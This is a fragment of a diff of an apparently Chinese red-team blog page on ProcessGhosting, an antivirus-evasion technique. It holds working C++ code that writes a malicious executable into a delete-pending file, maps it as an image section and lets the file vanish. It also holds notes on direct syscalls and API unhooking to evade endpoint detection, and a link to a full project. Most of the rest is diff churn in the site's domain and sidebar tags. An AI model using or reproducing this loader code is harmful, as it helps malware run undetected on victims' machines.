LARGE_INTEGER ByteOffset = &#123; <span class="hljs-number">0</span> &#125;;<br><br>    status = NtWriteFile(<br>        hDelFile,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        &amp;status_block,<br>        payladBuf,<br>        payloadSize,<br>        &amp;ByteOffset,<br>        <span class="hljs-literal">NULL</span><br>    );<span class="hljs-comment">//将传入的black exe的内存地址写入temp文件</span><br>    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br>        DWORD err = GetLastError();<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed writing payload! Error: &quot;</span> &lt;&lt; hex &lt;&lt; err &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;<br>    &#125;<br>    HANDLE hSection = <span class="hljs-literal">nullptr</span>;<br>    status = NtCreateSection(&amp;hSection,<br>        SECTION_ALL_ACCESS,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0</span>,<br>        PAGE_READONLY,<br>        SEC_IMAGE,<br>        hDelFile<br>    );<span class="hljs-comment">//为temp文件创建section</span><br>    <span class="hljs-keyword">if</span> (status != STATUS_SUCCESS) &#123;<br>        <span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;NtCreateSection failed: &quot;</span> &lt;&lt; hex &lt;&lt; status &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;<br>    &#125;<br>    NtClose(hDelFile);<span class="hljs-comment">//关闭handle，同时temp文件消失</span><br>    hDelFile = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">return</span> hSection;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs C"><br>HANDLE <span class="hljs-title function_">make_section_from_delete_pending_file</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* filePath, BYTE* payladBuf, DWORD payloadSize)</span> &#123;<br>    HANDLE hDelFile = open_file(filePath);<span class="hljs-comment">//打开temp文件</span><br>    NTSTATUS status = <span class="hljs-number">0</span>;<br>    IO_STATUS_BLOCK status_block = &#123; <span class="hljs-number">0</span> &#125;;<br><br>    FILE_DISPOSITION_INFORMATION info = &#123; <span class="hljs-number">0</span> &#125;;<br>    info.DeleteFile = TRUE;<br>    status = NtSetInformationFile(hDelFile, &amp;status_block, &amp;info, <span class="hljs-keyword">sizeof</span>(info), FileDispositionInformation);<span class="hljs-comment">//改变文件对象信息，将设置为请求删除文件状态。</span><br>    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Setting information failed: &quot;</span> &lt;&lt; hex &lt;&lt; status &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;<br>    &#125;<br>    LARGE_INTEGER ByteOffset = &#123; <span class="hljs-number">0</span> &#125;;<br><br>    status = NtWriteFile(<br>        hDelFile,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        &amp;status_block,<br>        payladBuf,<br>        payloadSize,<br>        &amp;ByteOffset,<br>        <span class="hljs-literal">NULL</span><br>    );<span class="hljs-comment">//将传入的black exe的内存地址写入temp文件</span><br>    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br>        DWORD err = GetLastError();<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed writing payload! Error: &quot;</span> &lt;&lt; hex &lt;&lt; err &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;<br>    &#125;<br>    HANDLE hSection = nullptr;<br>    status = NtCreateSection(&amp;hSection,<br>        SECTION_ALL_ACCESS,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0</span>,<br>        PAGE_READONLY,<br>        SEC_IMAGE,<br>        hDelFile<br>    );<span class="hljs-comment">//为temp文件创建section</span><br>    <span class="hljs-keyword">if</span> (status != STATUS_SUCCESS) &#123;<br>        <span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;NtCreateSection failed: &quot;</span> &lt;&lt; hex &lt;&lt; status &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;<br>    &#125;<br>    NtClose(hDelFile);<span class="hljs-comment">//关闭handle，同时temp文件消失</span><br>    hDelFile = nullptr;<br><br>    <span class="hljs-keyword">return</span> hSection;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h2 id="后续研究"><a href="#后续研究" class="headerlink" title="后续研究"></a>后续研究</h2><p>在整个项目中，需要用到NtCreateProcessEx和NtCreateThreadEx这样的敏感函数，通过对这两个函数进行systemcall，使用直接系统调用的方式来进行免杀处理。并使用unhook api，来解NtReadVirtualMemory、NtAllocateVirtualMemory、NtWriteVirtualMemory这几个对内存操作的nt函数hook。</p>
 <p>具体代码项目地址：<a target="_blank" rel="noopener" href="https://github.com/knightswd/ProcessGhosting">https://github.com/knightswd/ProcessGhosting</a></p>
@@ -554,10 +554,10 @@
     <!-- license -->
     
         <div class="license-wrapper">
-            <p>原文作者：<a href="https://jd.army">JD.Army</a>
-            <p>原文链接：<a href="https://jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">https://jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</a>
-            <p>发表日期：<a href="https://jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">July 23rd 2021, 3:50:18 pm</a>
-            <p>更新日期：<a href="https://jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">November 26th 2021, 11:11:09 am</a>
+            <p>原文作者：<a href="https://blog.jd.army">JD.Army</a>
+            <p>原文链接：<a href="https://blog.jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">https://blog.jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</a>
+            <p>发表日期：<a href="https://blog.jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">July 23rd 2021, 3:50:18 pm</a>
+            <p>更新日期：<a href="https://blog.jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">November 26th 2021, 11:11:09 am</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -1246,6 +1246,8 @@
         
         
         
+        
+        
     
     
     
@@ -1536,16 +1538,6 @@
                 流量
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Java">
-                <span class="iconfont-archer">&#xe606;</span>
-                Java
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="代码审计">
-                <span class="iconfont-archer">&#xe606;</span>
-                代码审计
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="windows">
                 <span class="iconfont-archer">&#xe606;</span>
                 windows
@@ -1564,6 +1556,16 @@
             <span class="sidebar-tag-name" data-tags="漏洞">
                 <span class="iconfont-archer">&#xe606;</span>
                 漏洞
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Java">
+                <span class="iconfont-archer">&#xe606;</span>
+                Java
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="代码审计">
+                <span class="iconfont-archer">&#xe606;</span>
+                代码审计
             </span>
         
             <span class="sidebar-tag-name" data-tags="codeql">
@@ -1596,16 +1598,6 @@
                 kerberosting
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Red Teaming">
-                <span class="iconfont-archer">&#xe606;</span>
-                Red Teaming
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Scoring System">
-                <span class="iconfont-archer">&#xe606;</span>
-                Scoring System
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="ProcessGhosting">
                 <span class="iconfont-archer">&#xe606;</span>
                 ProcessGhosting
@@ -1614,6 +1606,16 @@
             <span class="sidebar-tag-name" data-tags="进程">
                 <span class="iconfont-archer">&#xe606;</span>
                 进程
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Red Teaming">
+                <span class="iconfont-archer">&#xe606;</span>
+                Red Teaming
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Scoring System">
+                <span class="iconfont-archer">&#xe606;</span>
+                Scoring System
             </span>
         
             <span class="sidebar-tag-name" data-tags="红蓝对抗">
@@ -1967,11 +1969,6 @@
             渗透工具
         </span>
     
-        <span class="sidebar-category-name" data-categories="java">
-            <span class="iconfont-archer">&#xe60a;</span>
-            java
-        </span>
-    
         <span class="sidebar-category-name" data-categories="windows">
             <span class="iconfont-archer">&#xe60a;</span>
             windows
@@ -1987,19 +1984,24 @@
             漏洞分析
         </span>
     
+        <span class="sidebar-category-name" data-categories="java">
+            <span class="iconfont-archer">&#xe60a;</span>
+            java
+        </span>
+    
         <span class="sidebar-category-name" data-categories="渗透基础">
             <span class="iconfont-archer">&#xe60a;</span>
             渗透基础
         </span>
     
-        <span class="sidebar-category-name" data-categories="Research">
-            <span class="iconfont-archer">&#xe60a;</span>
-            Research
-        </span>
-    
         <span class="sidebar-category-name" data-categories="渗透技术">
             <span class="iconfont-archer">&#xe60a;</span>
             渗透技术
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Research">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Research
         </span>
     
         <span class="sidebar-category-name" data-categories="红蓝对抗">
@@ -2027,7 +2029,7 @@
         siteMetaRoot = '/'
     }
     var siteMeta = {
-        url: "https://jd.army",
+        url: "https://blog.jd.army",
         root: siteMetaRoot,
         author: "JD.Army"
     }
